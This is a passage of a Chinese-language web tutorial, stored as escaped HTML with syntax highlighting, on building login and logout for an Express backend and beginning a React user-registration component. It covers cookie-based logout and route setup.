&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isAuthenticated&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../middlewares/isAuthenticated&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/login&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;您可以使用Postman测试此端点，发送POST请求到：http://localhost:8000/api/v1/users/login&lt;/p&gt;
&lt;h3 id=&#34;登出功能&#34;&gt;登出功能
&lt;/h3&gt;&lt;p&gt;此时，您可以实现登出功能以安全地结束用户会话。为此，导航到您的authController.js文件并添加以下函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//创建登出函数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;logout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;catchAsync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;loggedout&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;expires&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;httpOnly&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NODE_ENV&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;production&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;成功登出&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此函数的工作原理是通过将名为token的认证cookie覆盖为值&amp;quot;loggedout&amp;quot;并使用new Date(0)将其过期时间设置为过去。这有效地使cookie无效并将其从浏览器中删除。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;httpOnly: true&lt;/code&gt;标志确保无法通过JavaScript访问cookie，这保护它免受XSS攻击，而secure标志确保cookie仅在生产环境中通过HTTPS发送。一旦清除cookie，将返回带有消息&amp;quot;成功登出&amp;quot;的成功响应以确认操作。&lt;/p&gt;
&lt;p&gt;接下来，将登出功能添加到您的路由：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;logout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../controller/authController&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isAuthenticated&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../middlewares/isAuthenticated&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;router&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/logout&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;logout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;然后，转到Postman测试您的登出功能，看看它是否工作。&lt;/p&gt;
&lt;h2 id=&#34;前端设置&#34;&gt;前端设置
&lt;/h2&gt;&lt;p&gt;现在您的后端已启动并运行，您可以将其集成到前端应用中。&lt;/p&gt;
&lt;p&gt;首先，使用命令&lt;code&gt;cd Frontend&lt;/code&gt;导航到前端目录。&lt;/p&gt;
&lt;p&gt;在src文件夹中创建一个新文件夹，您的认证相关文件将位于其中。根据您的偏好或应用结构，您可以将其命名为auth或pages之类。然后，创建一个名为NewUser.js的新文件。此文件将处理用户注册功能。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;axios&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;React&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;react&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Link&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useNavigate&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;react-router-dom&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Loader&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;lucide-react&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useDispatch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;react-redux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setAuthUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setPendingEmail&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;../../../../store/authSlice&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;API_URL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VITE_API_URL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;NewUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dispatch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useDispatch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;navigate&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useNavigate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;loading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setLoading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;formData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setFormData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;passwordConfirm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handleChange&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
